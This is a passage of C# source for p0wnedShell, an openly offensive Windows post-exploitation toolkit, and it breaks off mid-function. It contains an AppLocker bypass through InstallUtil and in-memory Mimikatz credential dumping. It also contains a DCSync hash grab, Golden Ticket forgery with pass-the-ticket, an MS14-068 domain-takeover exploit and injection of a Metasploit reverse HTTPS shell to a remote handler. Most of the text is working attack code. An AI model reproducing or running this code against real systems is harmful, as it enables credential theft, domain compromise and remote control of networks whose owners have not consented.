/*******************************************************************\
*            ____                          _______ __         ____  *
*     ____  / __ \_      ______  ___  ____/ / ___// /_  ___  / / /  *
*    / __ \/ / / / | /| / / __ \/ _ \/ __  /\__ \/ __ \/ _ \/ / /   *
*   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *
*  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *
* /_/                                                               *
*                                    By Cn33liz and Skons 2015      *
*                                                                   *
* PowerShell Runspace Post Exploitation Toolkit                     *
* For Bitch Ass Admins that tried to block our PowerShell candy ;)  *
*                                                                   *
*                                                              v1.2 *
\*******************************************************************/

/*
License: BSD 3-Clause

To Compile as x86 binary:
cd \Windows\Microsoft.NET\Framework\v4.0.30319
csc.exe /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx86.exe /platform:x86 "C:\p0wnedShell\*.cs"

To Compile as x64 binary:
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
csc.exe /unsafe /reference:"C:\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:C:\p0wnedShell\p0wnedShell.ico /out:C:\p0wnedShell\p0wnedShellx64.exe /platform:x64 "C:\p0wnedShell\*.cs"

To run as x86 binary and bypass Applocker (Credits for this great bypass go to Casey Smith aka subTee):
cd \Windows\Microsoft.NET\Framework\v4.0.30319
InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx86.exe

To run as x64 binary and bypass Applocker:
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx64.exe
*/

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Reflection;
using System.IO.Compression;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.DirectoryServices.ActiveDirectory;

//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace p0wnedShell
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction			
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        public static void PrintBanner(string[] toPrint = null)
        {
            Console.Clear();
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.WriteLine(@"*********************************************************************");
            Console.WriteLine(@"*            ____                          _______ __         ____  *");
            Console.WriteLine(@"*     ____  / __ \_      ______  ___  ____/ / ___// /_  ___  / / /  *");
            Console.WriteLine(@"*    / __ \/ / / / | /| / / __ \/ _ \/ __  /\__ \/ __ \/ _ \/ / /   *");
            Console.WriteLine(@"*   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *");
            Console.WriteLine(@"*  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *");
            Console.WriteLine(@"* /_/                                                               *");
            Console.WriteLine(@"*                                    /By Cn33liz and Skons 2015\    *");
            Console.WriteLine(@"*                                       \Cornelis@dePlaa.com/       *");
            Console.WriteLine(@"*                                                                   *");
            if (toPrint != null)
            {
                foreach (string item in toPrint)
                {
                    Console.WriteLine(item);
                }
            }
            Console.WriteLine(@"*                                                              v1.2 *");
            Console.WriteLine(@"*********************************************************************");
            Console.ResetColor();
            Console.WriteLine();
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetShortPathName(
            [MarshalAs(UnmanagedType.LPTStr)]
            string path,
            [MarshalAs(UnmanagedType.LPTStr)]
            StringBuilder shortPath,
            int shortPathLength
            );

        public static string P0wnedPath()
        {
            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
            BinaryPath = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");
            BinaryPath = BinaryPath.Remove(BinaryPath.LastIndexOf(@"\"));

            StringBuilder shortPath = new StringBuilder(255);
            GetShortPathName(BinaryPath, shortPath, shortPath.Capacity);
            return (shortPath.ToString());
        }

        public static string DetectProxy()
        {
            string url = "http://www.google.com/";
            // Create a new request to the mentioned URL.				
            HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);

            // Obtain the 'Proxy' of the  Default browser.  
            IWebProxy proxy = myWebRequest.Proxy;
            // Print the Proxy Url to the console.

            string ProxyURL = proxy.GetProxy(myWebRequest.RequestUri).ToString();

            if (ProxyURL != url)
            {
                return ProxyURL.TrimEnd('/');
            }
            else
            {
                return null;
            }
        }

        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        // remove one character from the list of password characters
                        password = password.Substring(0, password.Length - 1);
                        // get the location of the cursor
                        int pos = Console.CursorLeft;
                        // move the cursor to the left by one character
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        // replace it with space
                        Console.Write(" ");
                        // move the cursor to the left by one character again
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            // add a new line because user pressed enter at the end of their password
            Console.WriteLine();
            return password;
        }
        
        public static int DisplayMenu()
        {
            string[] toPrint = { "* PowerShell Runspace Post Exploitation Toolkit                     *",
                                 "* For Bitch Ass Admins that try to block our PowerShell candy ;)    *",
                                 "*                                                                   *" };
            Program.PrintBanner(toPrint);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Information Gathering:\n");
            Console.ResetColor();
            Console.WriteLine(" 1. Use PowerView to gain network situational awareness on Windows Domains.");
            Console.WriteLine();
            Console.WriteLine(" 2. Scan for IP-Addresses, HostNames and open Ports in your Network.");
            Console.WriteLine();
            Console.WriteLine(" 3. User Sysinternals accesschk to ennumerate accessible objects, i.e. writable directories");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Code Execution:\n");
            Console.ResetColor();
            Console.WriteLine(" 4. Reflectively load Mimikatz executable into Memory, bypassing AV/AppLocker.");
            Console.WriteLine();
            Console.WriteLine(" 5. Inject Metasploit reversed https Shellcode into Memory.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Privilege Escalation:\n");
            Console.ResetColor();
            Console.WriteLine(" 6. Use PowerUp tool to assist with local privilege escalation on Windows Systems.");
            Console.WriteLine();
            Console.WriteLine(" 7. Use Mimikatz dcsync to collect NTLM hashes from the Domain.");
            Console.WriteLine();
            Console.WriteLine(" 8. Use Mimikatz to generate a Golden Ticket for the Domain.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Exploitation:\n");
            Console.ResetColor();
            Console.WriteLine(" 9. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
            Console.WriteLine();
            Console.WriteLine(" 10. Gain SYSTEM through MS15-051.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Lateral Movement:\n");
            Console.ResetColor();
            Console.WriteLine(" 11. Use PsExec to execute commands on remote system.");
            Console.WriteLine();
            Console.WriteLine(" 12. Execute Mimikatz on a remote computer to dump credentials.");
            Console.WriteLine();
            Console.WriteLine(" 13. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[*] Others:\n");
            Console.ResetColor();
            Console.WriteLine(" 14. Execute PowerShell Commands (Including PowerSploit and Veil's PowerTools Post Exploitation Modules).");
            Console.WriteLine();
            Console.WriteLine(" 15. Reflectively load a ReactOS Command shell into Memory, bypassing AV/AppLocker.");
            Console.WriteLine();
            Console.WriteLine("\n 16. Exit");
            Console.Write("\nEnter choice: ");
            var result = Console.ReadLine();

            try
            {
                return Convert.ToInt32(result);
            }
            catch
            {
                return 0;
            }
        }

        public static void Main()
        {
            Console.Title = "p0wnedShell - PowerShell Runspace Post Exploitation Toolkit";
            Console.SetWindowSize(Math.Min(120, Console.LargestWindowWidth), Math.Min(65, Console.LargestWindowHeight));
            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int userInput = 0;

            do
            {
                userInput = DisplayMenu();
                switch (userInput)
                {
                    case 1:
                        Pshell.PowerView();
                        break;
                    case 2:
                        Pshell.PortScan();
                        break;
                    case 3:
                        if (Arch == "x86")
                        {
                            Pshell.AccessCheck();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 4:
                        if (Arch == "AMD64")
                        {
                            Pshell.MimiShell();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 5:
                        if (Arch == "x86")
                        {
                            Pshell.Meterpreter();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 6:
                        Pshell.PowerUp();
                        break;
                    case 7:
                        if (Arch == "AMD64")
                        {
                            Pshell.DCSync();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 8:
                        if (Arch == "AMD64")
                        {
                            Pshell.GoldenTicket();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 9:
                        if (Arch == "x86")
                        {
                            Pshell.MS14_068();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 10:
                        Pshell.MS15_051();
                        break;
                    case 11:
                        if (Arch == "x86")
                        {
                            Pshell.PsExec();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    case 12:
                        Pshell.Remote_Mimikatz();
                        break;
                    case 13:
                        PowerCat.PowerMenu();
                        break;
                    case 14:
                        Pshell.InvokeShell();
                        break;
                    case 15:
                        if (Arch == "x86")
                        {
                            Pshell.ReactShell();
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                            Console.ResetColor();
                            Console.WriteLine("Press Enter to Continue...");
                            Console.ReadLine();
                        }
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\nSee you later Alligator ;)");
                        Console.ResetColor();
                        break;
                }

            } while (userInput != 16);
        }
    }

    public class Pshell
    {

        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void InvokeShell()
        {
            string[] toPrint = { "* Type exit or quit to Exit                                         *" };
            Program.PrintBanner(toPrint);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[+] For remote fun use Enter-PSSession hostname (requires Powershell remoting and permissions to log in) \n");
            Console.Write("[+] You can use Get-Credential in case you already have valid admin credentials\n\n");
            Console.Write("[+] The following Post Exploitation modules are loaded:\n\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[+] PowerSploit Invoke-Shellcode\n");
            Console.Write("[+] PowerSploit Invoke-ReflectivePEInjection\n");
            Console.Write("[+] PowerSploit Invoke-Mimikatz\n");
            Console.Write("[+] PowerSploit Invoke-TokenManipulation\n");
            Console.Write("[+] Veil's PowerTools PowerUp\n");
            Console.Write("[+] Veil's PowerTools PowerView\n");
            Console.Write("[+] HarmJ0y's Invoke-Psexec\n");
            Console.Write("[+] Besimorhino's PowerCat\n");
            Console.Write("[+] Nishang Invoke-PsUACme\n");
            Console.Write("[+] Nishang Invoke-Encode\n");
            Console.Write("[+] Nishang Get-PassHashes\n");
            Console.Write("[+] Nishang Invoke-CredentialsPhish\n");
            Console.Write("[+] Nishang Port-Scan\n");
            Console.Write("[+] Nishang Copy-VSS\n\n");
            Console.Write("[+] Use Get-Help <ModuleName> for syntax usage and Have Fun :)\n\n");
            Console.ResetColor();

            P0wnedListener.CommandShell();
        }

        public static void MimiShell()
        {
            string[] toPrint = { "* Inject Mimikatz Binary into memory using ReflectivePEInjection    *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait until loaded...\n");

            string InvokeMimikatz = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Mimikatz() + "\" -split ' ') -ExeArgs \"privilege::debug sekurlsa::logonpasswords\" -Verbose";
            try
            {
                P0wnedListener.Execute(InvokeMimikatz);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

        public static void DCSync()
        {
            string[] toPrint = { "* Use Mimikatz dcsync to collect NTLM hashes from the Domain        *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("\n[+] For this attack to succeed, you need the Replicating Directory Changes account privileges (DSGetNCChanges).");
            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
            string User = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the name of the account from which we want the NTLM hash (e.g. krbtgt) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    User = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (User == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid user account, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n[+] Please wait while requesting our hash...\n\n");
            Console.ResetColor();

            //string DCSync = "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:"+User+"\"'";
            string DCSync = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Mimikatz() + "\" -split ' ') -ExeArgs '\"lsadump::dcsync /user:" + User + "\"'";
            try
            {
                P0wnedListener.Execute(DCSync);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

        public static void GoldenTicket()
        {
            string[] toPrint = { "* Use Mimikatz to generate a Golden Ticket for the Domain           *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Domain domain = Domain.GetCurrentDomain();
            DomainController Current_DC = domain.PdcRoleOwner;
            string DomainName = domain.ToString();

            Console.WriteLine("[+] First return the name of our current domain.\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(DomainName);
            Console.ResetColor();

            Console.WriteLine("\n[+] Now return the SID for our domain.\n");
            string DomainSID = Pshell.RunPSCommand("Get-DomainSID").ToString().TrimEnd('\r', '\n');

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(DomainSID);
            Console.ResetColor();

            Console.WriteLine("\n[+] For this attack to succeed, we need to have the ntlm hash of the krbtgt account.");
            Console.Write("[+] Do you have the ntlm hash of the krbtgt account? (y/n) > ");
            string krbtgt_hash = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the hash of our sweet krbtgt account > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    krbtgt_hash = Console.ReadLine();
                    Console.ResetColor();
                    if (krbtgt_hash.Length != 32)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid ntlm hash, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to get this hash using Mimikatz DCSync or a NTDS.dit dump.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.Write("\n[+] Now enter the name of the Super Human you want to be: ");
            Console.ForegroundColor = ConsoleColor.Green;
            string Super_Hero = Console.ReadLine();
            Console.ResetColor();

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Now wait while generating a forged Ticket-Granting Ticket (TGT)...\n");
            Console.ResetColor();

            string Golden_Ticket = "Invoke-Mimikatz -Command '\"kerberos::purge\" \"kerberos::golden /domain:" + DomainName + " /user:" + Super_Hero + " /sid:" + DomainSID + " /krbtgt:" + krbtgt_hash + " /ticket:" + Program.P0wnedPath() + "\\" + Super_Hero + ".ticket\"'";
            try
            {
                Console.WriteLine(RunPSCommand(Golden_Ticket));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            if (File.Exists(Program.P0wnedPath() + "\\" + Super_Hero + ".ticket"))
            {
                string Pass_The_Ticket = "Invoke-Mimikatz -Command '\"kerberos::ptt " + Program.P0wnedPath() + "\\" + Super_Hero + ".ticket\"'";
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Now lets inject our Kerberos ticket in the current session\n");
                Console.ResetColor();
                try
                {
                    Console.WriteLine(RunPSCommand(Pass_The_Ticket));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Oops something went wrong, please try again!\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }
            string DC_Listing = "Get-ChildItem \\\\" + Current_DC + "\\C$";
            string SuperPower = null;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] And finally check if we really have SuperPower:\n");
            Console.ResetColor();
            try
            {
                SuperPower = RunPSCommand(DC_Listing);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if (SuperPower.Length <= 5)
            {
                string Purge_Ticket = "Invoke-Mimikatz -Command '\"kerberos::purge\"'";
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Oops something went wrong, probably a wrong krbtgt Hash? Please try again!\n");
                Console.WriteLine("[+] Let's purge our invalid Ticket!\n");
                Console.ResetColor();
                File.Delete(Program.P0wnedPath() + "\\" + Super_Hero + ".ticket");
                try
                {
                    Console.WriteLine(RunPSCommand(Purge_Ticket));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] OwYeah, " + Super_Hero + " you are in Full Control of the Domain :)\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(DC_Listing));
            }
            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void MS14_068()
        {
            string[] toPrint = { "* Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability    *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Domain domain = Domain.GetCurrentDomain();
            DomainController Current_DC = domain.PdcRoleOwner;
            string DomainName = domain.ToString();

            Console.WriteLine("[+] First return the name of our current domain.\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(DomainName);
            Console.ResetColor();

            Console.WriteLine("\n[+] For this attack to succeed, we need a valid AD user account and password.");
            Console.Write("[+] Do you have a valid user account and password? (y/n) > ");
            string User = null;
            string Password = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter a username > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    User = Console.ReadLine();
                    Console.ResetColor();
                    if (User.Length < 2)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid user account, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    Console.Write("\n[+] Please enter a password > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Password = Program.ReadPassword();
                    Console.ResetColor();
                    if (Password.Length < 2)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid password, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to get a username and password.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Now wait while re-writing our user ticket to be a Domain Admin ticket (forged PAC)...\n");
            Console.ResetColor();

            string MS14_068 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.MS14_068() + "\" -split ' ') -ExeArgs \"/domain:" + DomainName + " /user:" + User + " /password:" + Password + " /ptt\" -Verbose";
            try
            {
                P0wnedListener.Execute(MS14_068);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            string DC_Listing = "Get-ChildItem \\\\" + Current_DC + "\\C$";
            string SuperPower = null;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] let's check if our exploit succeeded:\n");
            Console.ResetColor();
            try
            {
                SuperPower = RunPSCommand(DC_Listing);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if (SuperPower.Length <= 5)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Exploit failed, Wrong Username/Password combination or the Domain Controllers are already patched!\n");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] OwYeah, " + User + " you are in Full Control of the Domain :)\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(DC_Listing));
            }
            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void Meterpreter()
        {
            string[] toPrint = { "* Inject Metasploit reversed https Shellcode into Memory            *" };
            Program.PrintBanner(toPrint);

            IPAddress Lhost = IPAddress.Parse("1.1.1.1");
            int Lport = 0;

            while (true)
            {
                try
                {
                    Console.Write("Enter ip address of your Meterpreter handler (e.g. 1.1.1.1): ");
                    Lhost = IPAddress.Parse(Console.ReadLine());
                    Console.WriteLine();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
                    Console.ResetColor();
                }
            }

            while (true)
            {
                try
                {
                    Console.Write("Now Enter the listening port of your Meterpreter handler (e.g. 443 or 8443): ");
                    Lport = int.Parse(Console.ReadLine());
                    Console.WriteLine();

                    if (Lport < 1 || Lport > 65535)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                    Console.ResetColor();
                }
            }

            string InvokeReverseShell = "";
            string WebProxy = Program.DetectProxy();

            if (WebProxy != null)
            {
                Console.Write("\n\n[+] The following web Proxy is detected: ");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("{0}", WebProxy);
                Console.ResetColor();
                Console.WriteLine();
                Console.Write("\n[+] Do you want to use this proxy? (y/n) > ");
                string input = Console.ReadLine();
                switch (input.ToLower())
                {
                    case "y":
                        InvokeReverseShell = "[net.webrequest]::defaultwebproxy = new-object net.webproxy \"" + WebProxy + "\" ;" +
                                             "[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials ;" +
                                             "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force -verbose";
                        break;
                    case "n":
                        InvokeReverseShell = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force -verbose";
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                }
            }
            else
            {
                InvokeReverseShell = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force";
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n\n[+] Now make sure you setup your remote Meterpreter handler as follow:\n");
            Console.ResetColor();
            Console.WriteLine(@"[root@P0wnedHost ~]# msfconsole  ");
            Console.WriteLine(@"                                 ");
            Console.WriteLine(@"     ,           ,               ");
            Console.WriteLine(@"    /             \              ");
            Console.WriteLine(@"   ((__---,,,---__))             ");
            Console.WriteLine(@"      (_) O O (_)_________       ");
            Console.WriteLine(@"         \ _ /            |\     ");
            Console.WriteLine(@"          o_o \   M S F   | \    ");
            Console.WriteLine(@"               \   _____  |  *   ");
            Console.WriteLine(@"                |||   WW|||      ");
            Console.WriteLine(@"                |||     |||      ");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("use exploit/multi/handler");
            Console.WriteLine("set PAYLOAD windows/meterpreter/reverse_https");
            Console.WriteLine("set LHOST " + Lhost);
            Console.WriteLine("set LPORT " + Lport);
            Console.WriteLine("set AutoRunScript post/windows/manage/smart_migrate");
            Console.WriteLine("exploit");
            Console.ResetColor();
            Console.WriteLine("\nReady to Rumble? then Press Enter to continue and wait for Shell awesomeness :)");
            Console.ReadLine();

            try
            {
                P0wnedListener.Execute(InvokeReverseShell);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;

        }

        public static void PowerUp()
        {
            string[] toPrint = { "* Use PowerUp to assist with local privilege escalation.            *" };
            Program.PrintBanner(toPrint);

            Console.Write("[+] Please wait while running all checks...\n");

            string PowerUp_AllChecks = "Invoke-AllChecks";
            try
            {
                Console.WriteLine(RunPSCommand(PowerUp_AllChecks));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[+] Check above recommendations to assist with local privilege escalation.\n");
            Console.ResetColor();
            P0wnedListener.CommandShell();
            return;
        }

        public static void PowerView()
        {
            string[] toPrint = { "* Gain network situational awareness on Windows Domains.            *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            string NetForest = "Get-NetForest";
            string NetForestDomain = "Get-NetForestDomain";
            string NetForestTrust = "Get-NetForestTrust";
            string NetDomain = "Get-NetDomain";
            string DomainSID = "Get-DomainSID";
